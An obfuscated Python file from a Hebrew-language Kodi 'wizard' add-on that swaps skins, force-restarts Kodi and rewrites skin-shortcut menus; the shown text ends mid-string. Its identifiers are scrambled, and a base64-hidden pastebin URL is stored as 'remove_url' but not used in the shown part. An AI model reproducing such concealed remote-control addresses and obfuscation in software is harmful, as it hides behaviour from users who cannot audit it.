# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:219
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:220
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:221
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:222
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:223
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:224
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:225
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:226
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:227
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:228
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:229
LOGFILES =wiz .LOGFILES #line:230
TRAKTID =traktit .TRAKTID #line:231
DEBRIDID =debridit .DEBRIDID #line:232
LOGINID =loginit .LOGINID #line:233
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:234
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:235
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:236
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:237
fullsecfold =xbmc .translatePath ('special://home')#line:238
addons_folder =os .path .join (fullsecfold ,'addons')#line:240
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:242
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:244
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:246
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:247
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:248
def MainMenu ():#line:255
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:257
def skinWIN ():#line:258
	idle ()#line:259
	O0O00000O000O000O =glob .glob (os .path .join (ADDONS ,'skin*'))#line:260
	O0O0OOO0OOOO000O0 =[];OOO0O0OOOO0O0O0O0 =[]#line:261
	for OOOO00O00O00OO00O in sorted (O0O00000O000O000O ,key =lambda O0OOOOOOOOOO0O000 :O0OOOOOOOOOO0O000 ):#line:262
		OOO0O000000OOOO0O =os .path .split (OOOO00O00O00OO00O [:-1 ])[1 ]#line:263
		O0000OOO00OOOO0OO =os .path .join (OOOO00O00O00OO00O ,'addon.xml')#line:264
		if os .path .exists (O0000OOO00OOOO0OO ):#line:265
			OO0O0000O0OOOO000 =open (O0000OOO00OOOO0OO )#line:266
			OO0O000OOOOO00O00 =OO0O0000O0OOOO000 .read ()#line:267
			OO0O0O000O00OOOO0 =parseDOM2 (OO0O000OOOOO00O00 ,'addon',ret ='id')#line:268
			OO0O000O000OO0O0O =OOO0O000000OOOO0O if len (OO0O0O000O00OOOO0 )==0 else OO0O0O000O00OOOO0 [0 ]#line:269
			try :#line:270
				O0O0O0OOO0OOOOO00 =xbmcaddon .Addon (id =OO0O000O000OO0O0O )#line:271
				O0O0OOO0OOOO000O0 .append (O0O0O0OOO0OOOOO00 .getAddonInfo ('name'))#line:272
				OOO0O0OOOO0O0O0O0 .append (OO0O000O000OO0O0O )#line:273
			except :#line:274
				pass #line:275
	O0OO0O0O0O00OOO00 =[];O0O0OO00000OO00O0 =0 #line:276
	OO00OO00O0O000O0O =["Current Skin -- %s"%currSkin ()]+O0O0OOO0OOOO000O0 #line:277
	O0O0OO00000OO00O0 =DIALOG .select ("Select the Skin you want to swap with.",OO00OO00O0O000O0O )#line:278
	if O0O0OO00000OO00O0 ==-1 :return #line:279
	else :#line:280
		OOOO0OOOO000O0000 =(O0O0OO00000OO00O0 -1 )#line:281
		O0OO0O0O0O00OOO00 .append (OOOO0OOOO000O0000 )#line:282
		OO00OO00O0O000O0O [O0O0OO00000OO00O0 ]="%s"%(O0O0OOO0OOOO000O0 [OOOO0OOOO000O0000 ])#line:283
	if O0OO0O0O0O00OOO00 ==None :return #line:284
	for O000OOOO0O0OOOO0O in O0OO0O0O0O00OOO00 :#line:285
		swapSkins (OOO0O0OOOO0O0O0O0 [O000OOOO0O0OOOO0O ])#line:286
def currSkin ():#line:288
	return xbmc .getSkinDir ('Container.PluginName')#line:289
def swapSkins (O00O0OO0O00O0OOOO ,title ="Error"):#line:290
	O00O0OOO0OOO00O0O ='lookandfeel.skin'#line:291
	OO0O0000OO00OO000 =O00O0OO0O00O0OOOO #line:292
	O0O0O0O00O0OO0O00 =getOld (O00O0OOO0OOO00O0O )#line:293
	O0OOO0O0OO000000O =O00O0OOO0OOO00O0O #line:294
	setNew (O0OOO0O0OO000000O ,OO0O0000OO00OO000 )#line:295
	OO0O0OO00O0000OOO =0 #line:296
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0O0OO00O0000OOO <100 :#line:297
		OO0O0OO00O0000OOO +=1 #line:298
		xbmc .sleep (1 )#line:299
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:300
		xbmc .executebuiltin ('SendClick(11)')#line:301
	return True #line:302
def getOld (OOOOO000O0O0OO0OO ):#line:304
	try :#line:305
		OOOOO000O0O0OO0OO ='"%s"'%OOOOO000O0O0OO0OO #line:306
		O00000OOO000OOOO0 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OOOOO000O0O0OO0OO )#line:307
		OO0O0OOO0O00O0000 =xbmc .executeJSONRPC (O00000OOO000OOOO0 )#line:309
		OO0O0OOO0O00O0000 =simplejson .loads (OO0O0OOO0O00O0000 )#line:310
		if OO0O0OOO0O00O0000 .has_key ('result'):#line:311
			if OO0O0OOO0O00O0000 ['result'].has_key ('value'):#line:312
				return OO0O0OOO0O00O0000 ['result']['value']#line:313
	except :#line:314
		pass #line:315
	return None #line:316
def setNew (O00000OOOO00O0O0O ,OOO0O000000OO0O0O ):#line:319
	try :#line:320
		O00000OOOO00O0O0O ='"%s"'%O00000OOOO00O0O0O #line:321
		OOO0O000000OO0O0O ='"%s"'%OOO0O000000OO0O0O #line:322
		OOOO000O00O0O0O00 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O00000OOOO00O0O0O ,OOO0O000000OO0O0O )#line:323
		OO0OO0O0OOO000OOO =xbmc .executeJSONRPC (OOOO000O00O0O0O00 )#line:325
	except :#line:326
		pass #line:327
	return None #line:328
def idle ():#line:329
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:330
def resetkodi ():#line:332
		if xbmc .getCondVisibility ('system.platform.windows'):#line:333
			OO0OO0OO0OOO0O0OO =xbmcgui .DialogProgress ()#line:334
			OO0OO0OO0OOO0O0OO .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:337
			OO0OO0OO0OOO0O0OO .update (0 )#line:338
			for O000O00OOO00O0O00 in range (5 ,-1 ,-1 ):#line:339
				time .sleep (1 )#line:340
				OO0OO0OO0OOO0O0OO .update (int ((5 -O000O00OOO00O0O00 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O000O00OOO00O0O00 ),'')#line:341
				if OO0OO0OO0OOO0O0OO .iscanceled ():#line:342
					from resources .libs import win #line:343
					return None ,None #line:344
			from resources .libs import win #line:345
		else :#line:346
			OO0OO0OO0OOO0O0OO =xbmcgui .DialogProgress ()#line:347
			OO0OO0OO0OOO0O0OO .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:350
			OO0OO0OO0OOO0O0OO .update (0 )#line:351
			for O000O00OOO00O0O00 in range (5 ,-1 ,-1 ):#line:352
				time .sleep (1 )#line:353
				OO0OO0OO0OOO0O0OO .update (int ((5 -O000O00OOO00O0O00 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O000O00OOO00O0O00 ),'')#line:354
				if OO0OO0OO0OOO0O0OO .iscanceled ():#line:355
					os ._exit (1 )#line:356
					return None ,None #line:357
			os ._exit (1 )#line:358
def backtokodi ():#line:360
			wiz .kodi17Fix ()#line:361
			fix18update ()#line:362
			fix17update ()#line:363
def testcommand ():#line:364
			indicatorfastupdate ()#line:365
def rdoff ():#line:367
	resloginit .resloginit ('restore','all')#line:369
	OOO0000OO000OO0OO =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:370
	O000OOO00000O00O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:371
	copyfile (OOO0000OO000OO0OO ,O000OOO00000O00O0 )#line:372
def rdon ():#line:374
	loginit .loginIt ('restore','all')#line:375
	OOOO00OOO0OO000O0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:377
	O0O0O0O0O0OOO000O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:378
	copyfile (OOOO00OOO0OO000O0 ,O0O0O0O0O0OOO000O )#line:379
def adults18 ():#line:381
  O0O00OO00O0OOO000 =(ADDON .getSetting ("adults"))#line:382
  if O0O00OO00O0OOO000 =='true':#line:383
    OO00O00O00000OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:384
    with open (OO00O00O00000OOO0 ,'r')as O0O0OOOOOOOOO0O00 :#line:385
      OOOO0000O0O0OO000 =O0O0OOOOOOOOO0O00 .read ()#line:386
    OOOO0000O0O0OO000 =OOOO0000O0O0OO000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:404
    with open (OO00O00O00000OOO0 ,'w')as O0O0OOOOOOOOO0O00 :#line:407
      O0O0OOOOOOOOO0O00 .write (OOOO0000O0O0OO000 )#line:408
def rdbuildaddon ():#line:409
  OOOOOOO0OOOO00OO0 =(ADDON .getSetting ("rdbuild"))#line:410
  if OOOOOOO0OOOO00OO0 =='true':#line:411
    OOOOOO0OO000O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:412
    with open (OOOOOO0OO000O0000 ,'r')as OOOOO00000000O000 :#line:413
      O000OO0O000OO0O00 =OOOOO00000000O000 .read ()#line:414
    O000OO0O000OO0O00 =O000OO0O000OO0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:432
    with open (OOOOOO0OO000O0000 ,'w')as OOOOO00000000O000 :#line:435
      OOOOO00000000O000 .write (O000OO0O000OO0O00 )#line:436
    OOOOOO0OO000O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:440
    with open (OOOOOO0OO000O0000 ,'r')as OOOOO00000000O000 :#line:441
      O000OO0O000OO0O00 =OOOOO00000000O000 .read ()#line:442
    O000OO0O000OO0O00 =O000OO0O000OO0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:460
    with open (OOOOOO0OO000O0000 ,'w')as OOOOO00000000O000 :#line:463
      OOOOO00000000O000 .write (O000OO0O000OO0O00 )#line:464
    OOOOOO0OO000O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:468
    with open (OOOOOO0OO000O0000 ,'r')as OOOOO00000000O000 :#line:469
      O000OO0O000OO0O00 =OOOOO00000000O000 .read ()#line:470
    O000OO0O000OO0O00 =O000OO0O000OO0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:488
    with open (OOOOOO0OO000O0000 ,'w')as OOOOO00000000O000 :#line:491
      OOOOO00000000O000 .write (O000OO0O000OO0O00 )#line:492
    OOOOOO0OO000O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:496
    with open (OOOOOO0OO000O0000 ,'r')as OOOOO00000000O000 :#line:497
      O000OO0O000OO0O00 =OOOOO00000000O000 .read ()#line:498
    O000OO0O000OO0O00 =O000OO0O000OO0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:516
    with open (OOOOOO0OO000O0000 ,'w')as OOOOO00000000O000 :#line:519
      OOOOO00000000O000 .write (O000OO0O000OO0O00 )#line:520
    OOOOOO0OO000O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:523
    with open (OOOOOO0OO000O0000 ,'r')as OOOOO00000000O000 :#line:524
      O000OO0O000OO0O00 =OOOOO00000000O000 .read ()#line:525
    O000OO0O000OO0O00 =O000OO0O000OO0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:543
    with open (OOOOOO0OO000O0000 ,'w')as OOOOO00000000O000 :#line:546
      OOOOO00000000O000 .write (O000OO0O000OO0O00 )#line:547
    OOOOOO0OO000O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:549
    with open (OOOOOO0OO000O0000 ,'r')as OOOOO00000000O000 :#line:550
      O000OO0O000OO0O00 =OOOOO00000000O000 .read ()#line:551
    O000OO0O000OO0O00 =O000OO0O000OO0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:569
    with open (OOOOOO0OO000O0000 ,'w')as OOOOO00000000O000 :#line:572
      OOOOO00000000O000 .write (O000OO0O000OO0O00 )#line:573
    OOOOOO0OO000O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:575
    with open (OOOOOO0OO000O0000 ,'r')as OOOOO00000000O000 :#line:576
      O000OO0O000OO0O00 =OOOOO00000000O000 .read ()#line:577
    O000OO0O000OO0O00 =O000OO0O000OO0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
